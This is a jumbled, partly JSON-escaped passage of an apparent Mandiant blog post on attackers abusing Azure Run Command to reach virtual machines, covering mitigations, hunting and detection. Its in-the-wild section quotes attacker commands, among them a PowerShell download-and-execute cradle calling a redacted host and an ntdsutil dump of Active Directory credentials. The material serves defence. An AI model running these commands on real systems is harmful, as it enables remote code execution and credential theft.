        "action": "Microsoft.Compute/virtualMachines/runCommand/",
    },
(2) "caller": "user@contoso.com",
    "claims": {
(3)     "ipaddr": "127.0.0.1"
},
    "category": {
        "value": "Administrative",
        "localizedValue": "Administrative"
    },
    "eventTimestamp": "2021-10-28T20:25:33.5505986Z",
    "operationName": {
        "value": "Microsoft.Compute/virtualMachines/runCommand/",
        "localizedValue": "Run Command on Virtual Machine"
    },
    "resourceProviderName": {
        "value": "Microsoft.Compute",
        "localizedValue": "Microsoft.Compute"
    },
    "resourceType": {
        "value": "Microsoft.Compute/virtualMachines",
        "localizedValue": "Microsoft.Compute/virtualMachines"
    },
(1) "resourceId": "/subscriptions/6d356a32-8ac0-4541-b958-3304b11b7447/resourceGroups/[resourcegroupname]/providers/Microsoft.Compute/virtualMachines/testvm",
    "status": {
        "value": "Succeeded",
        "localizedValue": "Succeeded"
    }
}</code></pre>
</div>
</div>
</div>
</div>
</div>
<p><span lang="EN-IE">Unfortunately, Activity Logs do not include the command that was executed which would be required for further investigation. Regardless, these logs can be helpful to create baselines of expected Run Command usage in an environment to find anomalous and suspicious activity.</span></p>
<p><span lang="EN-IE">The goal of this blog post was to focus especially on the virtual machine side of this activity, and  Microsoft has already provided excellent guidance on <a href="https://techcommunity.microsoft.com/t5/microsoft-sentinel-blog/investigating-suspicious-azure-activity-with-microsoft-sentinel/ba-p/2985699" rel="noopener" target="_blank">hunting for suspicious Azure Run Commands in your tenant</a>.</span></p>
<h2>Conclusion</h2>
<p><span lang="EN-IE">As shown in our recent post, hypervisor level compromises afford threat actors with many opportunities for rapidly and stealthily exploiting hosted systems and applications. In this blog post, we discussed how one such method, Azure Run Command, is being leveraged by attackers and how defenders can hunt for, detect, and mitigate malicious usage of it.</span></p>
<p><span lang="EN-IE">Hypervisor compromises yield a high level of access to hosted systems and data, which are commonly an attacker’s primary objective in an intrusion. This evolution of intrusion methodology requires a thorough understanding of built-in cloud asset management functionality that can be abused by attackers. More importantly, this activity reinforces the need for comprehensive visibility and a vigilance for anomalous activity within environments.</span></p>
<h2>MITRE ATT&amp;CK</h2>
<p><span lang="EN-IE">Abusing the hypervisor to virtual machine interaction via Azure Run Commands can lead to full lifecycle adversary interaction including all stages of ATT&amp;CK. However, the ATT&amp;CK Tactics and Techniques observed include but are not limited to:</span></p>
<p><span lang="EN-IE">Initial Access                       External Remote Services (T1133)</span></p>
<p><span lang="EN-IE">Initial Access                       Valid Accounts (T1078)</span></p>
<p><span lang="EN-IE">Execution                            Command and Scripting Interpreter (T1059)</span></p>
<p><span lang="EN-IE">Persistence                         External Remote Services (T1133)</span></p>
<p><span lang="EN-IE">Persistence                         Valid Accounts (T1078)</span></p>
<p><span lang="EN-IE">Privilege Escalation            Valid Accounts (T1078)</span></p>
<p><span lang="EN-IE">Defense Evasion (TA0005)</span></p>
<div>

Bataille, Anders Vejlby, Jared Scott Wilson, Nader Zaveri\u003c/p\u003e\n\u003chr\u003e"]]],[null,null,[null,[null,"\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eIn Mandiant’s recent blog post, we detailed \u003c/span\u003e\u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/russian-targeting-gov-business\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan lang\u003d\"EN-IE\"\u003esuspected Russian intrusion activity\u003c/span\u003e\u003c/a\u003e\u003cspan lang\u003d\"EN-IE\"\u003e that targeted managed services providers (MSP) to gain access to their customers’ cloud environments. Other companies, such as Microsoft, have observed \u003c/span\u003e\u003ca href\u003d\"https://blogs.microsoft.com/on-the-issues/2021/10/24/new-activity-from-russian-actor-nobelium/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan lang\u003d\"EN-IE\"\u003esimilarly targeted activity\u003c/span\u003e\u003c/a\u003e\u003cspan lang\u003d\"EN-IE\"\u003e against customers of several \u003c/span\u003e\u003ca href\u003d\"https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan lang\u003d\"EN-IE\"\u003ecloud and managed service providers\u003c/span\u003e\u003c/a\u003e\u003cspan lang\u003d\"EN-IE\"\u003e.\u003csup\u003e \u003c/sup\u003eOne notable technique from these intrusions is the use of Azure Run Commands to move laterally from managed hypervisors to the MSP customers’ underlying virtual machines.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThis latest blog post comes as a supplementary annex to highlight Azure Run Commands and provide guidance for mitigations, hunting, and detection mainly from the perspective of the virtual machines at risk from this type of activity. As other blog posts have focused on Azure logs and permissions and what can be learned from these sources, here we will focus more on what can be learned from the evidence sources inside the virtual machines themselves.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThis method of pivoting from Azure to the underlying virtual machines (VMs) is significant for a couple of reasons:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAn Azure account compromise could result in granting full access to underlying Virtual Machines, even when those systems are segmented on the virtual layer.\u003c/span\u003e\u003c/li\u003e\n\u003cli\u003e\u003cspan lang\u003d\"EN-IE\"\u003eRunning commands through Azure means there is an easy route for elevated privilege execution, without worrying about connectivity and authorization at the virtual layer.\u003c/span\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eIn most cases, the final goal of the attacker is related to the virtual level and not the hypervisor. For example, an attacker is likely interested in stealing information residing inside the virtual systems or encrypting the data and individual systems themselves. While a hypervisor level compromise may allow attackers to circumvent many host-level detection and response mechanisms, there are still opportunities to identify attackers as they pursue their mission objectives.\u003c/span\u003e\u003c/p\u003e\n\u003ch2\u003eAzure Run Commands\u003c/h2\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThe Azure Run Command feature enables administrators to run commands on Azure Windows or Linux virtual machines by leveraging the virtual machine agent. The agent is installed by default on Windows and Linux virtual machines deployed from an Azure Marketplace image but can be disabled.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAzure Run Commands are well documented on the Microsoft website at the following locations:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href\u003d\"https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eRun scripts in your Windows VM by using action Run Commands\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href\u003d\"https://docs.microsoft.com/en-us/azure/virtual-machines/linux/run-command\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eRun scripts in your Linux VM by using action Run Commands\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAzure administrators can run them using the Azure Portal user interface, the API, PowerShell, or the Azure command line interface; each of which will be demonstrated as follows. Each operating system has distinct command types that support arbitrary script execution on virtual machines.\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cspan lang\u003d\"EN-IE\"\u003eOn Windows, the \u003c/span\u003e\u003cem\u003e\u003cspan lang\u003d\"EN-IE\"\u003eRunPowerShellScript\u003c/span\u003e\u003c/em\u003e\u003cspan lang\u003d\"EN-IE\"\u003e command executes PowerShell on the virtual machine as the SYSTEM user.\u003c/span\u003e\u003c/li\u003e\n\u003cli\u003e\u003cspan lang\u003d\"EN-IE\"\u003eOn Linux, the \u003c/span\u003e\u003cem\u003e\u003cspan lang\u003d\"EN-IE\"\u003eRunShellScript\u003c/span\u003e\u003c/em\u003e\u003cspan lang\u003d\"EN-IE\"\u003e command executes a shell script on the virtual machine as the root user.\u003c/span\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThese command types must be supplied via the “command-id” parameter when using the Run Command feature.\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003eVia Azure Portal\u003c/h3\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eFigure 1 shows two commands ‘w’ and ‘whoami’ sent to our Linux virtual machine using the Azure Portal web console.\u003c/span\u003e\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 1: Azure run commands towards a Linux host\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/azure1_xlfk.max-1300x1300.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/azure1_xlfk.max-1100x1100.png CLI\u003c/h3\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAdministrators can execute a PowerShell script by name using the following Azure CLI command.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eaz vm run-command invoke --command-id RunPowerShellScript --name winvm -g \r\nresourcegroup --scripts @myscript.ps1 --parameters \"arg1\u003dfirstarg\"\r\n\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAzure CLI also accepts individual commands, such as in the following example using the Linux VM “RunShellScript” module.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eaz vm run-command invoke -g resourcegroup -n linuxvm --command-id RunShellScript --\r\nscripts \"uname -a\"\r\n\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eVia the REST API\u003c/h3\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThe Azure REST API’s runCommand endpoint accepts HTTP POST requests such as the following, with \u003c/span\u003e\u003cspan lang\u003d\"EN-IE\"\u003erequired parameters\u003c/span\u003e\u003cspan lang\u003d\"EN-IE\"\u003e, defined in the POST request body.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ehttps://management.azure.com/subscriptions/{subscriptionId}/re\r\nsourceGroups/{resourceGroupName}/providers/Microsoft.Compute/v\r\nirtualMachines/{vmName}/runCommand?api-version\u003d2021-07-01\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eVia PowerShell Cmdlet\u003c/h3\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThe Azure PowerShell cmdlet also includes a command for Azure Run Commands. Note that the proper Azure Context needs to be provided either by running the \u003c/span\u003e\u003cem\u003e\u003cspan lang\u003d\"EN-IE\"\u003eConnect-AzAccount\u003c/span\u003e\u003c/em\u003e\u003cspan lang\u003d\"EN-IE\"\u003e command or using the -Context parameter.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eInvoke-AzVMRunCommand -ResourceGroupName 'resourcegroup' -Name 'winvm' -CommandId \r\n'RunPowerShellScript' -ScriptPath 'myscript.ps1'\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cem\u003e\u003cspan lang\u003d\"EN-IE\"\u003eInvoke-AzVMRunCommand\u003c/span\u003e\u003c/em\u003e\u003cspan lang\u003d\"EN-IE\"\u003e returns a PSRunCommandResult object with the script results in the “Message” field. In Figure 2, the results contain “nt authority\\system”, because the script executed a single whoami command.\u003c/span\u003e\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 2: Azure run commands via PowerShell\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/azure2_trlt.max-1200x1200.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/azure2_trlt.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/azure2_trlt.max-1200x1200.png 1195w"," 1060px,  1195px","https://storage.googleapis.com/gweb-cloudblog-publish/images/azure2_trlt.max-1200x1200.png"],null,3]]],[null,null,[null,[null,"\u003ch2\u003eMitigations\u003c/h2\u003e\n\u003ch3\u003eLimiting Run Command Access\u003c/h3\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAs \u003c/span\u003e\u003ca href\u003d\"https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan lang\u003d\"EN-IE\"\u003edocumented by Microsoft\u003c/span\u003e\u003c/a\u003e\u003cspan lang\u003d\"EN-IE\"\u003e, executing Run Commands requires the \u003c/span\u003e\u003cem\u003e\u003cspan lang\u003d\"EN-IE\"\u003eMicrosoft.Compute/virtualMachines/runCommand/ \u003c/span\u003e\u003c/em\u003e\u003cspan lang\u003d\"EN-IE\"\u003epermission. The Virtual Machine Contributor role and higher levels have this permission. The Virtual Machine Contributor role has the ability to manage the virtual machines but are not allowed to access the virtual machine, storage account, and virtual network it resides in. Performing regular Azure permissions audits or limiting the number of users with this permission would reduce the attack surface of accounts that can execute Run Commands.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAn organization can perform an audit of the Virtual Machine Contributor role or other high-level roles with the following PowerShell command.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eGet-AzureRmRoleAssignment | ? {$_.RoleDefinitionName -eq 'Virtual Machine \r\nContributor'} | ft RoleDefinitionName, UserPrincipalName, DisplayName\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eSince we are mainly concerned with the permission that allow for Azure RunCommand usage, the following script queries all built-in and custom roles created within Azure that contain the specific RunCommand permission.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eimport sys\r\nfrom azure.identity import DefaultAzureCredential\r\nfrom azure.mgmt.authorization import AuthorizationManagementClient \r\n\r\nif len(sys.argv) \u0026lt; 2:\r\n    print(\u0026quot;You need to supply the permission to search for\u0026quot;)\r\n    sys.exit(1)\r\n \r\ncredential \u003d DefaultAzureCredential()\r\nclient \u003d AuthorizationManagementClient(\r\n    credential\u003dcredential,\r\n    subscription_id\u003d\u0026quot;YOUR_SUBSCRIPTION_ID\u0026quot;\r\n)\r\n \r\ndesired_action \u003d sys.argv[1]\r\ndesired_action_lower \u003d desired_action.lower()\r\ndesired_action_wildcard \u003d \u0026quot;/\u0026quot;.join(desired_action_lower.split(\u0026quot;/\u0026quot;)[:-1] + [\u0026quot;*\u0026quot;])\r\n \r\nrole_definitions \u003d list(client.role_definitions.list(scope\u003d\u0026quot;\u0026quot;))\r\nfor role_def in client.role_definitions.list(scope\u003d\u0026quot;\u0026quot;):\r\n    for permission in role_def.permissions:\r\n        for action in permission.actions:\r\n            if action.lower() \u003d\u003d desired_action_lower or action.lower() \u003d\u003d desired_action_wildcard:\r\n                print(f\u0026quot;Role \u0026#39;{role_def.role_name}\u0026#39; contains {action}\u0026quot;)\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAfter an organization has identified all roles that have the ability to execute Run Commands on Virtual Machines, then it can use the previous PowerShell script to obtain the individual users or groups that have said permission. Mandiant recommends having regular entitlement reviews of this and other high-risk permissions with Azure.\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003eCreate a Custom Just-in-Time (JIT) Administrative Role for Run Command Permissions\u003c/h3\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAnother method to mitigate the risk and reducing the attack surface of this potential attack is by creating a Just-in-Time (JIT) administrative role that contains the Run Command permissions needed to perform legitimate run command-like actions on a virtual machine. By creating this custom role, we remove the need for a user to have persistent Run Command capabilities on Virtual Machines.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThe following sample PowerShell script creates a custom JIT Run Command role for a prescribed subscription and resource group (Note: Replace the subscriptionid and resourcegroupname with the desired organization’s subscription and resource group).\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$role \u003d Get-AzRoleDefinition \"Virtual Machine Contributor\"\r\n$role.Id \u003d $null\r\n$role.Name \u003d \"Run Command JIT Permissions\"\r\n$role.Description \u003d \"Can request JIT for Run Command actions on virtual machines.\"\r\n$role.Actions.Clear()\r\n$role.Actions.Add(\"Microsoft.Compute/virtualMachines/runCommand/*\")\r\n$role.AssignableScopes.Clear()\r\n$role.AssignableScopes.Add(\"/subscriptions/{subscriptionid}/resourceGroups/{resourcegroupname}/\")\r\nNew-AzRoleDefinition -Role $role\r\n \r\n$scope\u003d\"/subscriptions/{subscriptionid}/resourceGroups/{resourcegroupname}/\"\r\nNew-AzRoleAssignment -ObjectId {AD Group Object Id}  -RoleDefinitionName \"JIT Virtual Machine Run Command Role\" -Scope $scope\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAfter the custom JIT role has been made, Mandiant recommends assigning the JIT Role to a newly created Azure AD Group, and then managing the access to the newly created group using Azure Privileged Identity Management (PIM).\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003eRemoving the VM agent\u003c/h3\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThe most basic task that can be performed to mitigate this functionality is to remove the agent from the underlying VM, however, this may have serious consequences to how the virtual machine is administrated.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAlso, it is important to note that by doing so, you are not removing the attacker’s access to the hypervisor level, and they may have other means to steal your data or compromise hosts.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eBy removing the agent, you are also removing the main means that you can leverage for detecting this feature being used on your virtual machines. For example, if an attacker runs a command from the Azure CLI, you can detect this with proper detections in place. But if the attacker creates a snapshot of your system, this will be undetected. Therefore, it is critical to perform risk analysis to determine how to best proceed. Removing the agent entirely would eliminate a potential vector for the adversary to abuse but would also push the attacker away from your line of sight.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThe references at the following locations provide commands to remove the Windows and Linux agents:\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href\u003d\"https://docs.microsoft.com/en-us/troubleshoot/azure/virtual-machines/windows-azure-guest-agent\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eTroubleshooting Windows Azure Guest Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href\u003d\"https://docs.microsoft.com/en-us/azure/virtual-machines/linux/disable-provisioning\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan lang\u003d\"EN-IE\"\u003eDisable or remove the Linux Agent from VMs and images\u003c/span\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eMalicious Run Command Usage in the Wild\u003c/h2\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eMandiant has directly observed commands such as the following while conducting incident response investigations. These commands were executed in several different scripts and showcase an almost full chain of activity from reconnaissance to malicious code execution and credential harvesting.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#Reconnaissance\r\nGet-Process\r\nGet-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct\r\n(Get-Aduser -Filter *).Count\r\n(Get-Aduser -Filter *)[500]\r\nGet-MpComputerStatus\r\nGet-AdDomainController -Discover\r\ncmd /c whoami; ls C:\\\r\nls \u0026quot;C:\\Program Files\u0026quot;\r\nGet-Process | Select -First 25\r\n \r\n#Code Execution\r\nC:\\Windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe -C \u0026quot;iex((New-Object system.net.webclient).downloadstring(\u0026lt;redacted\u0026gt;))\u0026quot;\r\nWrite-Host (New-Object System.Net.WebClient).DownloadString(\u0026quot;http://\u0026lt;redacted\u0026gt;.com\u0026quot;)\r\n \r\n#Credential Harvesting\r\nntdsutil.exe \u0026#39;ac i ntds\u0026#39; \u0026#39;ifm\u0026#39; \u0026#39;create full C:\\Temp\\t\u0026#39; q q\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eAs we can see from the aforementioned examples, while Run Command usage may be relatively novel, the commands being executed represent known attacker techniques and methodologies. This means traditional detection logic for suspicious commands will still be valid, but these mechanisms can be augmented with the context that they were executed using the Run Command feature.\u003c/span\u003e\u003c/p\u003e\n\u003ch2\u003eDetection and Hunting\u003c/h2\u003e\n\u003ch3\u003eForensic Artifacts and File Paths\u003c/h3\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eDetection and Hunting on the affected virtual machines should use a combination of forensic artifacts and logs and differ between Windows and Linux virtual machines.\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003eWindows Virtual Machines\u003c/h4\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eOn Windows, the use of the RunPowerShellScript functionality will create related PowerShell logs depending on your logging policy. As such, any typical rules written for malicious activity leveraging these logs or process will provide alerts as normal. For additional resources on generic PowerShell logging, see the Mandiant post, “\u003c/span\u003e\u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/greater-visibility\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan lang\u003d\"EN-IE\"\u003eGreater Visibility Through PowerShell Logging\u003c/span\u003e\u003c/a\u003e\u003cspan lang\u003d\"EN-IE\"\u003e”.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eHowever, in our testing of a default Azure setup, the Azure Activity Log showed that Run Command functionality was used but did not log the contents of the actual script being pushed to the virtual machine for execution. This means that by default logs will show that a Run Command action was performed but not the commands executed within the script.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003eOn Windows virtual Each job directory contains three files: script.sh, stderr, and stdout.\u003c/span\u003e\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 6: Contents of the /var/lib/waagent/run-command/download directory\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/azure6_wlpw.max-1000x1000.png",null,null,"https://storage.googleapis.com/gweb-cloudblog-publish/images/azure6_wlpw.max-1000x1000.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThe file script.sh contains the command executed on the host; stderr contains the standard error; and stdout contains the result.\u003c/span\u003e\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 7: Contents of script.sh and stdout files\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/azure7.max-800x800.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/azure7.max-800x800.png 800w, https://storage.googleapis.com/gweb-cloudblog-publish/images/azure7.max-800x800.png 800w"," 800px,  800px","https://storage.googleapis.com/gweb-cloudblog-publish/images/azure7.max-800x800.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThese output files have less metadata than their Windows counterpart, but additional details are recorded in the following location: /var/log/azure/run-command/handler.log. Figure 10 shows the processes created after execution of \u003c/span\u003e\u003cem\u003e\u003cspan lang\u003d\"EN-IE\"\u003ewhoami\u003c/span\u003e\u003c/em\u003e\u003cspan lang\u003d\"EN-IE\"\u003e using RunPowerShellScript.\u003c/span\u003e\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 10: Process tree under WindowsAzureGuestAgent.exe as an execution of \"whoami\" is performed\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/azure10.max-800x800.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/azure10.max-800x800.png 800w, https://storage.googleapis.com/gweb-cloudblog-publish/images/azure10.max-800x800.png 800w"," 800px,  800px","https://storage.googleapis.com/gweb-cloudblog-publish/images/azure10.max-800x800.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eWith the parent/child relationship detection, engineers can create rules to detect commands, which may not be suspicious on their own, but would rarely be run through the aforementioned process tree. For example, \u003c/span\u003e\u003cem\u003e\u003cspan lang\u003d\"EN-IE\"\u003ewhoami.exe\u003c/span\u003e\u003c/em\u003e\u003cspan lang\u003d\"EN-IE\"\u003e may be common and benign in most cases, but suspicious if launched as a child of \u003c/span\u003e\u003cem\u003e\u003cspan lang\u003d\"EN-IE\"\u003epowershell -ExecutionPolicy Unrestricted -File script.ps1,\u003c/span\u003e\u003c/em\u003e\u003cspan lang\u003d\"EN-IE\"\u003e which would indicate potential reconnaissance. Commands with commonly malicious usage, such as \u003c/span\u003e\u003cem\u003e\u003cspan lang\u003d\"EN-IE\"\u003entdsutil.exe, \u003c/span\u003e\u003c/em\u003e\u003cspan lang\u003d\"EN-IE\"\u003eshould be of high concern if seen as a child process of WindowsAzureGuestAgent.exe.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eIf any usage of RunPowerShellScript is suspicious in your organization, you can monitor any sub-processes of WindowsAzureGuestAgent and whitelist commands as needed for legitimate management activity.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eIn addition to process anomalies, you can monitor file creation/modification events in the directories used by Azure Run Commands. If your monitoring solution logs the full file content for these events, it will show the actual commands being executed which can also be reviewed for malicious commands or anomalous usage.\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003eLinux Virtual Machines\u003c/h4\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eOn Linux, Azure run commands can be detected by looking for command lines such as the following:\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003enohup /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.2/bin/run-command-extension enable\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eFurthermore, parent-child relationships can be used to hunt for suspicious processes that have a parent process command line following this syntax:\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/bin/sh -c /var/lib/waagent/run-command/download/3/script.sh\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eSimilar to Windows, file monitoring solutions can be used to trigger alerts on file creations in the /var/lib/waagent/run-command/download directory, and match suspicious content if this is feasible.\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003eAzure-Level Detection and Hunting\u003c/h3\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eIn the Azure Portal, the Activity Logs for each VM will capture Azure Run Command executions. Azure Activity Logs can be found in numerous locations, depending on the environment, including but not limited to an Azure Sentinel instance, Microsoft Defender Advanced Hunting, a Log Analytics Workspace, or on the VM Azure Portal page itself.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan lang\u003d\"EN-IE\"\u003eThe following is an example alert for a Run Command action. This log shows that the “runCommand” for the virtual machine named testvm (1) was actioned and successfully executed via the user@contoso[.]com (2) account from IP address 127.0.0[.]1 (3).\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cpre\u003e\u003ccode\u003e{\r\n    \"authorization\": {\r\n        \"action\": \"Microsoft.Compute/virtualMachines/runCommand/\",\r\n    },\r\n(2) \"caller\": \"user@contoso.com\",\r\n    \"claims\": {\r\n(3)     \"ipaddr\": \"127.0.0.1\"\r\n},\r\n    \"category\": {\r\n
